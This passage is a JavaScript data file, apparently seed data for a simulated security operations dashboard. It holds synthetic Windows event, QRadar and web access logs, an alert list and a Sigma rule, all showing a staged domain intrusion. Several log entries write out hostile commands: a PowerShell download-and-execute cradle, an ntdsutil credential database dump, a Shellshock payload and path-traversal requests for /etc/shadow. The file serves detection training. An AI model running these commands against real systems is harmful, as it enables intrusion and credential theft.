  {ts:'2026-09-21T08:30:05Z',eventId:4625,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'An account failed to log on.',data:{TargetUserName:'admin',LogonType:10,IpAddress:'10.0.2.100',Status:'0xC000006D',SubStatus:'0xC0000064'}},
  {ts:'2026-09-21T08:30:10Z',eventId:4625,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'An account failed to log on.',data:{TargetUserName:'sa',LogonType:10,IpAddress:'10.0.2.100',Status:'0xC000006D',SubStatus:'0xC0000064'}},
  {ts:'2026-09-21T08:30:30Z',eventId:4624,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'An account was successfully logged on.',data:{TargetUserName:'svc-admin',LogonType:3,IpAddress:'10.0.2.100',AuthenticationPackageName:'NTLM',LogonProcessName:'NtLmSsp'}},
  {ts:'2026-09-21T08:31:00Z',eventId:4672,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'Special privileges assigned to new logon.',data:{SubjectUserName:'svc-admin',PrivilegeList:'SeDebugPrivilege SeBackupPrivilege SeRestorePrivilege SeTakeOwnershipPrivilege'}},
  {ts:'2026-09-21T08:31:30Z',eventId:4688,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A new process has been created.',data:{NewProcessName:'C:\\Windows\\System32\\cmd.exe',ParentProcessName:'C:\\Windows\\System32\\services.exe',SubjectUserName:'svc-admin',CommandLine:'cmd.exe /c whoami /all'}},
  {ts:'2026-09-21T08:32:00Z',eventId:4688,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A new process has been created.',data:{NewProcessName:'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',ParentProcessName:'C:\\Windows\\System32\\cmd.exe',SubjectUserName:'svc-admin',CommandLine:'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.0.2.100:8080/shell.ps1\')"'}},
  {ts:'2026-09-21T08:32:30Z',eventId:4720,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A user account was created.',data:{TargetUserName:'backdoor$',SubjectUserName:'svc-admin',SamAccountName:'backdoor$'}},
  {ts:'2026-09-21T08:33:00Z',eventId:4732,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A member was added to a security-enabled local group.',data:{TargetUserName:'backdoor$',GroupName:'Administrators',SubjectUserName:'svc-admin'}},
  {ts:'2026-09-21T08:33:30Z',eventId:4768,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A Kerberos authentication ticket (TGT) was requested.',data:{TargetUserName:'krbtgt',ServiceName:'krbtgt/CORP.LOCAL',IpAddress:'10.0.2.100',Status:'0x0',TicketEncryptionType:'0x17'}},
  {ts:'2026-09-21T08:34:00Z',eventId:4769,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A Kerberos service ticket was requested.',data:{TargetUserName:'svc-sql@CORP.LOCAL',ServiceName:'MSSQLSvc/DB-01.corp.local:1433',IpAddress:'10.0.2.100',TicketEncryptionType:'0x17'}},
  {ts:'2026-09-21T08:34:30Z',eventId:1102,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'The audit log was cleared.',data:{SubjectUserName:'svc-admin',SubjectDomainName:'CORP'}},
  {ts:'2026-09-21T08:35:00Z',eventId:7045,channel:'System',computer:'DC-01.corp.local',level:'Information',msg:'A service was installed in the system.',data:{ServiceName:'WindowsUpdate',ImagePath:'C:\\Windows\\Temp\\svc.exe',ServiceType:'user mode service',StartType:'auto start',AccountName:'LocalSystem'}},
  {ts:'2026-09-21T08:35:30Z',eventId:4698,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A scheduled task was created.',data:{TaskName:'\\Microsoft\\Windows\\UpdateCheck',SubjectUserName:'svc-admin',TaskContent:'<Actions><Exec><Command>C:\\Windows\\Temp\\beacon.exe</Command></Exec></Actions>'}},
  {ts:'2026-09-21T08:36:00Z',eventId:5156,channel:'Security',computer:'WS-JSMITH-01',level:'Information',msg:'Windows Filtering Platform permitted a connection.',data:{Application:'\\device\\harddiskvolume2\\windows\\system32\\svchost.exe',Direction:'Outbound',SourceAddress:'10.0.2.100',DestAddress:'45.33.32.156',DestPort:443,Protocol:6}},
  {ts:'2026-09-21T08:36:30Z',eventId:4663,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'An attempt was made to access an object.',data:{SubjectUserName:'svc-admin',ObjectName:'\\\\FS-01\\Finance\\Q3-Results.xlsx',AccessMask:'0x1',ProcessName:'C:\\Windows\\System32\\cmd.exe'}},
  {ts:'2026-09-21T08:37:00Z',eventId:4663,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'An attempt was made to access an object.',data:{SubjectUserName:'svc-admin',ObjectName:'\\\\FS-01\\HR\\Employee-SSN.csv',AccessMask:'0x1',ProcessName:'C:\\Windows\\System32\\cmd.exe'}},
  {ts:'2026-09-21T08:37:30Z',eventId:4648,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A logon was attempted using explicit credentials.',data:{SubjectUserName:'svc-admin',TargetUserName:'domain-admin',TargetServerName:'DC-02.corp.local',ProcessName:'C:\\Windows\\System32\\runas.exe'}},
  {ts:'2026-09-21T08:38:00Z',eventId:1116,channel:'Microsoft-Windows-Windows Defender/Operational',computer:'WS-JSMITH-01',level:'Warning',msg:'Windows Defender Antivirus detected malware.',data:{ThreatName:'Trojan:Win32/CobaltStrike.B',Path:'C:\\Users\\jsmith\\AppData\\Local\\Temp\\beacon.dll',Action:'Quarantine',SeverityName:'Severe'}},
  {ts:'2026-09-21T08:38:30Z',eventId:11,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'FileCreate.',data:{TargetFilename:'C:\\Windows\\Temp\\mimikatz.exe',Image:'C:\\Windows\\System32\\cmd.exe',User:'CORP\\svc-admin'}},
  {ts:'2026-09-21T08:39:00Z',eventId:3,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'Network connection detected.',data:{Image:'C:\\Windows\\Temp\\beacon.dll',User:'CORP\\svc-admin',Protocol:'tcp',SourceIp:'10.0.2.100',SourcePort:49321,DestinationIp:'45.33.32.156',DestinationPort:443}},
  {ts:'2026-09-21T08:39:30Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\net.exe',CommandLine:'net group "Domain Admins" /domain',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe',ParentCommandLine:'cmd.exe /c'}},
  {ts:'2026-09-21T08:40:00Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\nltest.exe',CommandLine:'nltest /dclist:corp.local',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe'}},
  {ts:'2026-09-21T08:40:30Z',eventId:1,channel:'Microsoft-Windows-Sysmon/Operational',computer:'WS-JSMITH-01',level:'Information',msg:'Process Create.',data:{Image:'C:\\Windows\\System32\\dsquery.exe',CommandLine:'dsquery computer -limit 0',User:'CORP\\svc-admin',ParentImage:'C:\\Windows\\System32\\cmd.exe'}},
  {ts:'2026-09-21T08:41:00Z',eventId:4776,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'The computer attempted to validate the credentials for an account.',data:{TargetUserName:'svc-admin',Workstation:'WS-JSMITH-01',Status:'0x0'}},
  {ts:'2026-09-21T08:41:30Z',eventId:5145,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'A network share object was checked to see whether client can be granted desired access.',data:{SubjectUserName:'svc-admin',ShareName:'\\\\*\\Finance$',ShareLocalPath:'D:\\Shares\\Finance',AccessMask:'0x1',IpAddress:'10.0.2.100'}},
  {ts:'2026-09-21T08:42:00Z',eventId:5145,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'A network share object was checked to see whether client can be granted desired access.',data:{SubjectUserName:'svc-admin',ShareName:'\\\\*\\HR$',ShareLocalPath:'D:\\Shares\\HR',AccessMask:'0x1',IpAddress:'10.0.2.100'}},
  {ts:'2026-09-21T08:42:30Z',eventId:5145,channel:'Security',computer:'FS-01.corp.local',level:'Information',msg:'A network share object was checked to see whether client can be granted desired access.',data:{SubjectUserName:'svc-admin',ShareName:'\\\\*\\IT$',ShareLocalPath:'D:\\Shares\\IT',AccessMask:'0x1',IpAddress:'10.0.2.100'}},
  {ts:'2026-09-21T08:43:00Z',eventId:4688,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A new process has been created.',data:{NewProcessName:'C:\\Windows\\System32\\ntdsutil.exe',ParentProcessName:'C:\\Windows\\System32\\cmd.exe',SubjectUserName:'svc-admin',CommandLine:'ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_dump" q q'}},
  {ts:'2026-09-21T08:43:30Z',eventId:4799,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A security-enabled local group membership was enumerated.',data:{TargetUserName:'Administrators',SubjectUserName:'svc-admin',CallerProcessName:'C:\\Windows\\System32\\net.exe'}},
  {ts:'2026-09-21T08:44:00Z',eventId:4657,channel:'Security',computer:'WS-JSMITH-01',level:'Information',msg:'A registry value was modified.',data:{SubjectUserName:'svc-admin',ObjectName:'\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',ObjectValueName:'SecurityUpdate',NewValue:'C:\\Windows\\Temp\\update.exe'}},
  {ts:'2026-09-21T08:44:30Z',eventId:4697,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'A service was installed in the system.',data:{SubjectUserName:'svc-admin',ServiceName:'WinDefenderUpdate',ServiceFileName:'C:\\Windows\\Temp\\svc_backdoor.exe',ServiceType:'0x10',ServiceStartType:'2'}},
  {ts:'2026-09-21T08:45:00Z',eventId:1100,channel:'Security',computer:'DC-02.corp.local',level:'Information',msg:'The event logging service has shut down.',data:{SubjectUserName:'SYSTEM'}},
  {ts:'2026-09-21T08:45:30Z',eventId:4771,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'Kerberos pre-authentication failed.',data:{TargetUserName:'admin',Status:'0x18',IpAddress:'10.0.2.100',PreAuthType:'0x2'}},
  {ts:'2026-09-21T08:46:00Z',eventId:4771,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'Kerberos pre-authentication failed.',data:{TargetUserName:'administrator',Status:'0x18',IpAddress:'10.0.2.100',PreAuthType:'0x2'}},
  {ts:'2026-09-21T08:46:30Z',eventId:4662,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'An operation was performed on an object.',data:{SubjectUserName:'svc-admin',ObjectType:'domainDNS',Properties:'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2',OperationType:'Object Access'}},
];

const LEEF_LOGS = [
  {ts:'2026-09-21T08:40:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|NetworkConnection|src=10.0.2.100\tdst=45.33.32.156\tdstPort=443\tproto=TCP\tidentSrc=CrowdStrike\tsev=8\tcat=C2\tmsg=Suspected C2 beacon detected'},
  {ts:'2026-09-21T08:40:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|AuthFailure|src=185.220.101.34\tdst=10.0.1.5\tdstPort=22\tproto=TCP\tusrName=root\tsev=6\tcat=Authentication\tmsg=SSH brute force from Tor exit node'},
  {ts:'2026-09-21T08:41:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|DataExfil|src=10.0.2.100\tdst=198.51.100.50\tdstPort=443\tproto=TCP\tsev=9\tcat=DataLoss\tmsg=Large data transfer to external host: 450MB in 5 minutes'},
  {ts:'2026-09-21T08:41:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|PrivEsc|src=10.0.2.100\tusrName=svc-admin\tsev=8\tcat=PrivilegeEscalation\tmsg=Service account granted SeDebugPrivilege'},
  {ts:'2026-09-21T08:42:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|LateralMovement|src=10.0.2.100\tdst=10.0.2.200\tdstPort=445\tproto=TCP\tsev=7\tcat=LateralMovement\tmsg=SMB admin share access from compromised host'},
  {ts:'2026-09-21T08:42:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|AuditClear|src=DC-01\tsev=10\tcat=DefenseEvasion\tmsg=Windows Security Audit Log cleared by non-SYSTEM user svc-admin'},
  {ts:'2026-09-21T08:43:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|Persistence|src=10.0.2.100\tsev=8\tcat=Persistence\tmsg=Registry Run key modified for persistence: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate'},
  {ts:'2026-09-21T08:43:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|CredDump|src=10.0.2.100\tsev=9\tcat=CredentialAccess\tmsg=LSASS memory dump detected via comsvcs.dll MiniDump technique'},
  {ts:'2026-09-21T08:44:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|DCSync|src=10.0.2.100\tdst=10.0.1.1\tsev=10\tcat=CredentialAccess\tmsg=DCSync replication request from non-domain-controller host'},
  {ts:'2026-09-21T08:44:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|Kerberoast|src=10.0.2.100\tdst=DC-01\tsev=8\tcat=CredentialAccess\tmsg=Multiple TGS requests with RC4 encryption targeting service accounts'},
  {ts:'2026-09-21T08:45:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|ReconActivity|src=10.0.2.100\tsev=6\tcat=Discovery\tmsg=Active Directory enumeration via LDAP objectClass=* queries from non-admin workstation'},
  {ts:'2026-09-21T08:45:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|WebShellUpload|src=203.0.113.42\tdst=10.0.1.20\tdstPort=443\tsev=9\tcat=Persistence\tmsg=Suspicious PHP file uploaded to webroot via POST request'},
  {ts:'2026-09-21T08:46:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|DNSTunnel|src=10.0.2.100\tsev=8\tcat=Exfiltration\tmsg=DNS queries with encoded subdomain labels exceeding 50 characters to evil-c2.xyz'},
  {ts:'2026-09-21T08:46:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|PrivEsc|src=10.0.2.100\tusrName=svc-admin\tsev=9\tcat=PrivilegeEscalation\tmsg=Token impersonation detected: explicit credentials used for domain-admin account'},
  {ts:'2026-09-21T08:47:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|RansomBehavior|src=10.0.2.150\tsev=10\tcat=Impact\tmsg=Mass file rename with .locked extension detected across 3 network shares'},
  {ts:'2026-09-21T08:47:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|EmailExfil|src=10.0.3.75\tsev=6\tcat=DataLoss\tmsg=Inbox rule created to forward all email to external address attacker@evil-domain.com'},
  {ts:'2026-09-21T08:48:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|ContainerEscape|src=k8s-worker-01\tsev=9\tcat=PrivilegeEscalation\tmsg=Container process attempted to access host PID namespace'},
  {ts:'2026-09-21T08:48:30Z',raw:'LEEF:2.0|IBM|QRadar|7.5|SupplyChain|src=apt-mirror\tsev=7\tcat=InitialAccess\tmsg=Package integrity verification failed for downloaded package from untrusted repository'},
  {ts:'2026-09-21T08:49:00Z',raw:'LEEF:2.0|IBM|QRadar|7.5|ImpossibleTravel|src=198.51.100.99\tusrName=jsmith@company.com\tsev=6\tcat=InitialAccess\tmsg=Successful auth from Beijing 45 min after auth from New York'},
];

const ACCESS_LOGS = [
  {ts:'2026-09-21T08:45:00Z',raw:'10.0.3.50 - - [21/Sep/2026:08:45:00 +0000] "GET / HTTP/1.1" 200 5432 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"'},
  {ts:'2026-09-21T08:45:01Z',raw:'10.0.3.50 - - [21/Sep/2026:08:45:01 +0000] "GET /static/style.css HTTP/1.1" 200 12340 "https://app.company.com/" "Mozilla/5.0"'},
  {ts:'2026-09-21T08:45:05Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:05 +0000] "GET /admin HTTP/1.1" 403 198 "-" "Nikto/2.1.6"'},
  {ts:'2026-09-21T08:45:06Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:06 +0000] "GET /wp-login.php HTTP/1.1" 404 162 "-" "Nikto/2.1.6"'},
  {ts:'2026-09-21T08:45:07Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:07 +0000] "GET /phpmyadmin HTTP/1.1" 404 162 "-" "Nikto/2.1.6"'},
  {ts:'2026-09-21T08:45:08Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:08 +0000] "GET /.env HTTP/1.1" 403 162 "-" "Nikto/2.1.6"'},
  {ts:'2026-09-21T08:45:10Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:10 +0000] "POST /api/login HTTP/1.1" 401 89 "-" "python-requests/2.28.0"'},
  {ts:'2026-09-21T08:45:11Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:11 +0000] "POST /api/login HTTP/1.1" 401 89 "-" "python-requests/2.28.0"'},
  {ts:'2026-09-21T08:45:12Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:12 +0000] "POST /api/login HTTP/1.1" 401 89 "-" "python-requests/2.28.0"'},
  {ts:'2026-09-21T08:45:15Z',raw:'10.0.2.100 - admin [21/Sep/2026:08:45:15 +0000] "POST /api/export?format=csv&table=users HTTP/1.1" 200 892340 "-" "curl/7.68.0"'},
  {ts:'2026-09-21T08:45:20Z',raw:'10.0.2.100 - admin [21/Sep/2026:08:45:20 +0000] "POST /api/export?format=csv&table=transactions HTTP/1.1" 200 4523100 "-" "curl/7.68.0"'},
  {ts:'2026-09-21T08:45:25Z',raw:'198.51.100.99 - - [21/Sep/2026:08:45:25 +0000] "GET /api/v2/users?page=1&limit=10000 HTTP/1.1" 200 1893400 "-" "python-requests/2.28.0"'},
  {ts:'2026-09-21T08:45:30Z',raw:'10.0.3.60 - - [21/Sep/2026:08:45:30 +0000] "GET /api/dashboard HTTP/1.1" 200 2340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"'},
  {ts:'2026-09-21T08:45:35Z',raw:'10.0.3.60 - - [21/Sep/2026:08:45:35 +0000] "POST /api/reports/generate HTTP/1.1" 200 45230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"'},
  {ts:'2026-09-21T08:45:40Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:40 +0000] "GET /actuator/env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1)"'},
  {ts:'2026-09-21T08:45:45Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:45 +0000] "GET /server-status HTTP/1.1" 403 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1)"'},
  {ts:'2026-09-21T08:45:50Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:50 +0000] "GET /.git/config HTTP/1.1" 403 162 "-" "Mozilla/5.0 (compatible; Googlebot/2.1)"'},
  {ts:'2026-09-21T08:45:55Z',raw:'203.0.113.42 - - [21/Sep/2026:08:45:55 +0000] "GET /api/debug/vars HTTP/1.1" 404 162 "-" "DirBuster-1.0-RC1"'},
  {ts:'2026-09-21T08:46:00Z',raw:'10.0.2.100 - svc-admin [21/Sep/2026:08:46:00 +0000] "POST /api/admin/users/export HTTP/1.1" 200 2345600 "-" "curl/7.68.0"'},
  {ts:'2026-09-21T08:46:05Z',raw:'10.0.2.100 - svc-admin [21/Sep/2026:08:46:05 +0000] "POST /api/admin/config/backup HTTP/1.1" 200 890120 "-" "curl/7.68.0"'},
  {ts:'2026-09-21T08:46:10Z',raw:'198.51.100.23 - - [21/Sep/2026:08:46:10 +0000] "GET /cgi-bin/../../../../etc/passwd HTTP/1.1" 400 166 "-" "() { :;};/bin/bash -c \'cat /etc/passwd\'"'},
  {ts:'2026-09-21T08:46:15Z',raw:'10.0.3.50 - jsmith [21/Sep/2026:08:46:15 +0000] "GET /api/profile HTTP/1.1" 200 1230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'},
  {ts:'2026-09-21T08:46:20Z',raw:'10.0.3.70 - admin [21/Sep/2026:08:46:20 +0000] "PUT /api/admin/settings HTTP/1.1" 200 89 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"'},
  {ts:'2026-09-21T08:46:25Z',raw:'203.0.113.42 - - [21/Sep/2026:08:46:25 +0000] "POST /api/search HTTP/1.1" 403 198 "-" "sqlmap/1.7"'},
  {ts:'2026-09-21T08:46:30Z',raw:'203.0.113.42 - - [21/Sep/2026:08:46:30 +0000] "GET /api/../../../etc/shadow HTTP/1.1" 400 166 "-" "sqlmap/1.7"'},
];

// ========== ALERTS ==========
const ALERTS = [
  {id:'ALT-001',title:'SSH Brute Force from Tor Exit Node',severity:'High',status:'New',source:'IDS',timestamp:'2026-09-21T08:01:12Z',srcIp:'185.220.101.34',dstIp:'10.0.1.5',rule:'SSH_BRUTE_FORCE',count:50,mitre:'T1110.001',analyst:null},
  {id:'ALT-002',title:'SQL Injection Attempt Detected',severity:'Critical',status:'New',source:'WAF',timestamp:'2026-09-21T08:04:15Z',srcIp:'10.0.3.50',dstIp:'10.0.1.20',rule:'SQLI_UNION',count:1,mitre:'T1190',analyst:null},
  {id:'ALT-003',title:'Cobalt Strike Beacon Communication',severity:'Critical',status:'Investigating',source:'EDR',timestamp:'2026-09-21T08:07:00Z',srcIp:'10.0.2.100',dstIp:'45.33.32.156',rule:'CS_BEACON_C2',count:15,mitre:'T1071.001',analyst:'Analyst-1'},
  {id:'ALT-004',title:'Suspicious PowerShell with Encoded Command',severity:'High',status:'Investigating',source:'EDR',timestamp:'2026-09-21T08:21:00Z',srcIp:'10.0.2.100',dstIp:null,rule:'PS_ENCODED_CMD',count:3,mitre:'T1059.001',analyst:'Analyst-1'},
  {id:'ALT-005',title:'New Admin Account Created',severity:'High',status:'Escalated',source:'SIEM',timestamp:'2026-09-21T08:32:30Z',srcIp:'10.0.2.100',dstIp:'DC-01',rule:'PRIV_ACCOUNT_CREATE',count:1,mitre:'T1136.001',analyst:'Analyst-2'},
  {id:'ALT-006',title:'Ransomware File Encryption Behavior',severity:'Critical',status:'New',source:'EDR',timestamp:'2026-09-21T08:28:00Z',srcIp:'10.0.2.150',dstIp:null,rule:'RANSOMWARE_ENCRYPT',count:1,mitre:'T1486',analyst:null},
  {id:'ALT-007',title:'Large Data Exfiltration to External Host',severity:'Critical',status:'Investigating',source:'DLP',timestamp:'2026-09-21T08:41:00Z',srcIp:'10.0.2.100',dstIp:'198.51.100.50',rule:'DATA_EXFIL_VOLUME',count:1,mitre:'T1048',analyst:'Analyst-1'},
  {id:'ALT-008',title:'DNS Query to Known C2 Domain',severity:'High',status:'New',source:'DNS',timestamp:'2026-09-21T08:05:30Z',srcIp:'10.0.2.100',dstIp:'evil-c2.xyz',rule:'DNS_C2_DOMAIN',count:2,mitre:'T1071.004',analyst:null},
  {id:'ALT-009',title:'Audit Log Cleared on Domain Controller',severity:'Critical',status:'Escalated',source:'SIEM',timestamp:'2026-09-21T08:34:30Z',srcIp:'DC-01',dstIp:null,rule:'LOG_CLEAR',count:1,mitre:'T1070.001',analyst:'Analyst-2'},
  {id:'ALT-010',title:'Kerberoasting Activity Detected',severity:'High',status:'New',source:'SIEM',timestamp:'2026-09-21T08:34:00Z',srcIp:'10.0.2.100',dstIp:'DC-01',rule:'KERBEROAST',count:5,mitre:'T1558.003',analyst:null},
  {id:'ALT-011',title:'Web Scanner Activity (Nikto)',severity:'Medium',status:'Resolved',source:'WAF',timestamp:'2026-09-21T08:45:05Z',srcIp:'203.0.113.42',dstIp:'10.0.1.20',rule:'WEB_SCANNER',count:12,mitre:'T1595.002',analyst:'Analyst-3'},
  {id:'ALT-012',title:'Mimikatz Binary Dropped on Host',severity:'Critical',status:'Investigating',source:'EDR',timestamp:'2026-09-21T08:38:30Z',srcIp:'10.0.2.100',dstIp:null,rule:'MIMIKATZ_DROP',count:1,mitre:'T1003.001',analyst:'Analyst-1'},
  {id:'ALT-013',title:'Suspicious Service Installation',severity:'High',status:'New',source:'SIEM',timestamp:'2026-09-21T08:35:00Z',srcIp:'DC-01',dstIp:null,rule:'SVC_INSTALL_SUSP',count:1,mitre:'T1543.003',analyst:null},
  {id:'ALT-014',title:'Scheduled Task Created for Persistence',severity:'High',status:'New',source:'SIEM',timestamp:'2026-09-21T08:35:30Z',srcIp:'DC-01',dstIp:null,rule:'SCHTASK_PERSIST',count:1,mitre:'T1053.005',analyst:null},
  {id:'ALT-015',title:'Mass File Access on File Server',severity:'High',status:'Investigating',source:'DLP',timestamp:'2026-09-21T08:37:00Z',srcIp:'10.0.2.100',dstIp:'FS-01',rule:'MASS_FILE_ACCESS',count:45,mitre:'T1039',analyst:'Analyst-1'},
  {id:'ALT-016',title:'Azure Sign-in from Unusual Location',severity:'Medium',status:'New',source:'Azure AD',timestamp:'2026-09-21T08:17:30Z',srcIp:'45.33.32.156',dstIp:null,rule:'AZURE_UNUSUAL_SIGNIN',count:1,mitre:'T1078.004',analyst:null},
  {id:'ALT-017',title:'IAM User Created with Admin Policy',severity:'Critical',status:'New',source:'CloudTrail',timestamp:'2026-09-21T08:16:00Z',srcIp:'198.51.100.50',dstIp:null,rule:'AWS_IAM_ADMIN_CREATE',count:1,mitre:'T1098',analyst:null},
  {id:'ALT-018',title:'S3 Bucket Made Public',severity:'Critical',status:'Escalated',source:'CloudTrail',timestamp:'2026-09-21T08:16:30Z',srcIp:'198.51.100.50',dstIp:null,rule:'S3_PUBLIC_BUCKET',count:1,mitre:'T1530',analyst:'Analyst-2'},
  {id:'ALT-019',title:'Container Image from Untrusted Registry',severity:'Medium',status:'New',source:'K8s',timestamp:'2026-09-21T08:09:00Z',srcIp:'k8s-master',dstIp:'registry.evil.com',rule:'K8S_UNTRUSTED_IMAGE',count:1,mitre:'T1610',analyst:null},
  {id:'ALT-020',title:'Lateral Movement via SMB Admin Share',severity:'High',status:'Investigating',source:'NDR',timestamp:'2026-09-21T08:42:00Z',srcIp:'10.0.2.100',dstIp:'10.0.2.200',rule:'SMB_LATERAL',count:3,mitre:'T1021.002',analyst:'Analyst-1'},
  {id:'ALT-021',title:'Pass-the-Hash Attack Detected',severity:'Critical',status:'New',source:'EDR',timestamp:'2026-09-21T08:30:30Z',srcIp:'10.0.2.100',dstIp:'DC-01',rule:'PASS_THE_HASH',count:1,mitre:'T1550.002',analyst:null},
  {id:'ALT-022',title:'Honeypot SSH Login Success',severity:'High',status:'New',source:'Honeypot',timestamp:'2026-09-21T08:14:00Z',srcIp:'198.51.100.23',dstIp:'honeypot-01',rule:'HONEYPOT_LOGIN',count:1,mitre:'T1110',analyst:null},
  {id:'ALT-023',title:'Okta Login from Impossible Travel',severity:'Medium',status:'New',source:'Okta',timestamp:'2026-09-21T08:19:00Z',srcIp:'198.51.100.99',dstIp:null,rule:'OKTA_IMPOSSIBLE_TRAVEL',count:1,mitre:'T1078',analyst:null},
  {id:'ALT-024',title:'GitHub Repository Downloaded by Unknown User',severity:'Medium',status:'New',source:'GitHub',timestamp:'2026-09-21T08:19:30Z',srcIp:'45.33.32.156',dstIp:null,rule:'GITHUB_REPO_DOWNLOAD',count:1,mitre:'T1213.003',analyst:null},
  {id:'ALT-025',title:'Emotet Malware Network Communication',severity:'Critical',status:'New',source:'IDS',timestamp:'2026-09-21T08:07:00Z',srcIp:'10.0.2.100',dstIp:'45.33.32.156',rule:'EMOTET_C2',count:1,mitre:'T1071',analyst:null},
  {id:'ALT-026',title:'DGA Domain Queries Detected',severity:'High',status:'New',source:'DNS',timestamp:'2026-09-21T08:05:31Z',srcIp:'10.0.2.100',dstIp:null,rule:'DGA_DETECTION',count:8,mitre:'T1568.002',analyst:null},
  {id:'ALT-027',title:'Credential Dumping via LSASS',severity:'Critical',status:'New',source:'EDR',timestamp:'2026-09-21T08:38:00Z',srcIp:'10.0.2.100',dstIp:null,rule:'LSASS_DUMP',count:1,mitre:'T1003.001',analyst:null},
  {id:'ALT-028',title:'Outbound SSH Scanning from Internal Host',severity:'Medium',status:'New',source:'IDS',timestamp:'2026-09-21T08:07:30Z',srcIp:'10.0.2.100',dstIp:null,rule:'SSH_SCAN_OUTBOUND',count:25,mitre:'T1046',analyst:null},
  {id:'ALT-029',title:'SharePoint Sensitive File Downloaded',severity:'Medium',status:'New',source:'O365',timestamp:'2026-09-21T08:20:30Z',srcIp:'198.51.100.50',dstIp:null,rule:'O365_SENSITIVE_DOWNLOAD',count:1,mitre:'T1213.002',analyst:null},
  {id:'ALT-030',title:'Phishing URL Accessed by Employee',severity:'Medium',status:'Resolved',source:'Proxy',timestamp:'2026-09-21T08:28:30Z',srcIp:'10.0.3.75',dstIp:'login-microsoft365.evil.com',rule:'PHISHING_URL',count:1,mitre:'T1566.002',analyst:'Analyst-3'},
];

// ========== SIGMA RULES ==========
const SIGMA_RULES = [
  {id:'SIG-001',title:'Suspicious PowerShell Encoded Command',status:'production',level:'high',
   yaml:'title: Suspicious PowerShell Encoded Command\nstatus: production\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: \'\\\\powershell.exe\'\n    CommandLine|contains:\n      - \'-enc\'\n      - \'-encodedcommand\'\n      - \'-EncodedCommand\'\n  condition: selection\nfalsepositives:\n  - Legitimate admin scripts\ntags:\n  - attack.execution\n  - attack.t1059.001',
   splunk:'index=windows sourcetype=WinEventLog:Security EventCode=4688 NewProcessName="*\\\\powershell.exe" (CommandLine="*-enc*" OR CommandLine="*-encodedcommand*")',
